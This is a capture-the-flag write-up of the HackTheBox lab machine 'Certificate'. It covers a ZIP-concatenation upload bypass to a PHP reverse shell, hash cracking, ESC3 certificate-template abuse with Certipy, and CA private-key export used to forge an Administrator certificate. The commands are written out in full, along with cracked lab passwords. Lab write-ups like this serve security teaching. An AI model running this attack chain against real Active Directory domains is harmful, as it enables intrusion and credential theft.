---
title: HackTheBox | Certificate | Hard 
published: 2025-09-23
description: "In this write-up, I explain how I gained ownership of Certificate on HackTheBox."
image: "./img/image.png"
tags: [CTF, HTB, write-up, Season8, AD]
category: 'CTF'
draft: false
---


# Walk-through

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-01 04:29:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-09-30T19:51:26
|_Not valid after:  2026-09-30T19:51:26
|_ssl-date: 2025-10-01T04:31:13+00:00; +8h00m07s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-09-30T19:51:26
|_Not valid after:  2026-09-30T19:51:26
|_ssl-date: 2025-10-01T04:31:14+00:00; +8h00m07s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-01T04:31:13+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-09-30T19:51:26
|_Not valid after:  2026-09-30T19:51:26
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-01T04:31:14+00:00; +8h00m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-09-30T19:51:26
|_Not valid after:  2026-09-30T19:51:26
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-10-01T04:30:36
|_  start_date: N/A
|_clock-skew: mean: 8h00m06s, deviation: 0s, median: 8h00m06s
```

I am going to generate the hosts file first:

```sh
netexec smb 10.10.11.71 --generate-hosts-file hosts
```

Add this entry to your `/etc/hosts`:

`10.10.11.71     DC01.certificate.htb certificate.htb DC01`

Next, let’s take a look at port 80.

![](img/Season%208%20-%20Certificate.png "Screenshot of the main page showing a course website written in PHP.")

It looks like the website is a course management platform built with PHP. You can create a student or teacher account, although teacher accounts require manual approval.

![](img/Season%208%20-%20Certificate-1.png "Screenshot of the account creation page highlighting the teacher account approval requirement.")

I registered as a student and browsed one of the available courses. Inside the course, there is a button to submit a quiz.

![](img/Season%208%20-%20Certificate-2.png "Screenshot showing the 'Submit Quiz' section available to students.")

There is an upload functionality that accepts only PDF, DOCX, PPTX, or XLSX files, but they must be provided inside a ZIP archive. This suggests we might be able to upload a malicious PHP file if we can bypass the file validation.

![](img/Season%208%20-%20Certificate-3.png "Screenshot of the upload form indicating allowed file types.")

Our first attempt results in a *Bad Request* error, meaning we need to find a way to bypass the upload restrictions.

![](img/Season%208%20-%20Certificate-4.png "Screenshot of failed upload request.")

Uploading a normal PDF inside a ZIP works without issues.

![](img/Season%208%20-%20Certificate-5.png "Screenshot of successful upload using a valid PDF.")

After searching online, I found information explaining *evasive ZIP concatenation*, which allows appending additional data to ZIP files. The original blog post was removed, but this PDF describes the technique in detail:
[https://infocon.org/mirrors/vx%20underground%20-%202025%20June/Papers/Malware%20Defense/Malware%20Analysis/2024/2024-11-07%20-%20Evasive%20ZIP%20Concatenation-%20Trojan%20Targets%20Windows%20Users.pdf](https://infocon.org/mirrors/vx%20underground%20-%202025%20June/Papers/Malware%20Defense/Malware%20Analysis/2024/2024-11-07%20-%20Evasive%20ZIP%20Concatenation-%20Trojan%20Targets%20Windows%20Users.pdf)

I applied the same technique to embed both a valid PDF and a malicious PHP file.

![](img/Season%208%20-%20Certificate-9.png "Screenshot showing successful ZIP concatenation containing a malicious PHP file.")

It worked.

![](img/Season%208%20-%20Certificate-8.png "Screenshot confirming the upload bypass was successful.")

Next, I attempted to use a reverse shell.

![](img/Season%208%20-%20Certificate-10.png "Screenshot of reverse shell payload inside the uploaded PHP file.")

To observe how the request behaves, I captured it using Burp Suite.

![](img/Season%208%20-%20Certificate-12.png "Burp Suite capture showing the upload request.")

After setting up a listener:

![](img/Season%208%20-%20Certificate-11.png "Screenshot of the terminal showing the netcat listener waiting for a callback.")

I explored the server and found database credentials.

![](img/Season%208%20-%20Certificate-13.png "Screenshot showing database connection information located on the server.")

Using these credentials, I inspected the users table.

![](img/Season%208%20-%20Certificate-14.png "Screenshot showing the 'users' table query results.")

![](img/Season%208%20-%20Certificate-15.png "Screenshot of password hashes extracted from the database.")

I cracked the bcrypt hash with John:

```
john --format=bcrypt
FOUND: User 'sara.b' has password 'Blink182'
```

I then checked what access `sara.b` had using NetExec.

![](img/Season%208%20-%20Certificate-16.png "Screenshot showing 'sara.b' SMB enumeration results.")

To collect more information, I gathered BloodHound data:

```sh
rusthound-ce --domain certificate.htb -u sara.b -p $PASS
```

Nothing interesting appeared, so I continued exploring Sara’s files. I found a PCAP file with a note mentioning issues accessing SMB shares.

![](img/Season%208%20-%20Certificate-17.png "Screenshot showing the PCAP file found in Sara's directory.")

Using NetworkMiner (Netresec), I inspected the capture. Helpful references:

[https://www.netresec.com/?page=Blog&month=2019-11&post=Extracting-Kerberos-Credentials-from-PCAP](https://www.netresec.com/?page=Blog&month=2019-11&post=Extracting-Kerberos-Credentials-from-PCAP)

[https://www.netresec.com/?page=Blog&month=2025-04&post=How-to-Install-NetworkMiner-in-Linux](https://www.netresec.com/?page=Blog&month=2025-04&post=How-to-Install-NetworkMiner-in-Linux)

[https://www.netresec.com/?page=Blog&month=2012-12&post=HowTo-handle-PcapNG-files](https://www.netresec.com/?page=Blog&month=2012-12&post=HowTo-handle-PcapNG-files)

I extracted the Kerberos hash for `lion.sk`.

![](img/Season%208%20-%20Certificate-18.png "Screenshot showing extracted Kerberos hash of lion.sk.")

I cracked it:

![](img/Season%208%20-%20Certificate-19.png "Screenshot of cracking results showing the plaintext password.")

Password: `!QAZ2wsx`

With this, I obtained the user flag.

![](img/Season%208%20-%20Certificate-20.png "Screenshot displaying the user.txt flag.")

BloodHound showed that `lion.sk` belongs to the *CRA Managers* group. I ran Certipy:

```sh
certipy-ad find -vulnerable -u lion.sk@certificate.htb -p $PASS2 -stdout
```

This identified a template vulnerable to ESC3.

![](img/Season%208%20-%20Certificate-21.png "Screenshot showing vulnerable certificate templates supporting ESC3.")

Since the *CRA Managers* group has the required privileges, I searched for a suitable target template:

```sh
certipy-ad find -u lion.sk@certificate.htb -p $PASS2 -stdout
```

The results showed that `SignedUser` was a valid target.

![](img/Season%208%20-%20Certificate-22.png "Screenshot confirming SignedUser can be used as a target template.")

Attempting to request on behalf of Administrator failed due to missing email attributes, so I listed users with email addresses:

```sh
ldapsearch -x -H ldap://10.10.11.71 -D "lion.sk@certificate.htb" -w $PASS2 -b "DC=certificate,DC=htb" "(mail=*)" sAMAccountName mail
```

I reviewed user profiles on the machine:

```text
Directory: C:\Users

Administrator
akeder.kh
Lion.SK
Public
Ryan.K
Sara.B
xamppuser
```

Since `akeder.kh` was not listed earlier and `sara.b` was already compromised, I targeted `ryan.k`.

Requesting a certificate:

```sh
certipy-ad req -u lion.sk@certificate.htb -p $PASS2 -dc-ip 10.10.11.71 -ca Certificate-LTD-CA -target 'DC01.certificate.htb' -template 'Delegated-CRA'
```

Then:

```sh
certipy-ad req -u lion.sk@certificate.htb -p $PASS2 -dc-ip 10.10.11.71 -ca Certificate-LTD-CA -target 'DC01.certificate.htb' -template 'SignedUser' -on-behalf-of ryan.k -pfx lion.sk.pfx
```

Authenticating:

```sh
certipy-ad auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 -domain certificate.htb
```

Now I had his NT hash.

Inspecting privileges:

```sh
whoami /priv
```

`ryan.k` had `SeManageVolumePrivilege`, which is exploitable. Exploit reference:
[https://github.com/CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)

Running it:

```sh
./SeManageVolumeExploit.exe
```

I confirmed modified ACLs:

```sh
icacls C:\Windows
```

Trying to inject a DLL would trip Windows Defender, so instead I extracted the private key of the CA to forge an Administrator certificate.

```powershell
certutil -exportPFX my "Certificate-LTD-CA" C:\temp\ca.pfx
```

Using Certipy to forge:

```sh
certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
```

Authenticate as Administrator:

```sh
certipy-ad auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
```

And with that, we fully compromised the machine.
